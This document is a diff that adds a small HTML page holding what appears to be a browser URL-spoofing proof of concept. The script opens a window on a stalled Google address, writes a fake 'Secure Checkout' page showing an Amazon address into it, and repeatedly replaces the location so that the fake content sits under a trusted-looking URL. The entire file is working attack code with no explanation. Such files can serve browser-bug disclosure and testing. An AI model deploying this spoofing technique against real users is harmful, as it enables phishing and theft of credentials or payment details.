@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+
+<button id="open">Open Page</button>
+
+<script>
+let win;
+
+function spoofFlow() {
+  win = window.open('https://www.google.com:82', 'legit');
+
+  if (!win) return;
+
+  win.document.write(`
+    <h3>Secure Checkout</h3>
+    <p>https://www.amazon.com</p>
+  `);
+
+  setInterval(() => {
+    try {
+      win.location.href;
+    } catch (e) {
+      win.location.replace('https://www.google.com/csi');
+    }
+  }, 1);
+}
+
+document.getElementById('open').onclick = spoofFlow;
+</script>
+
+</body>
+</html>
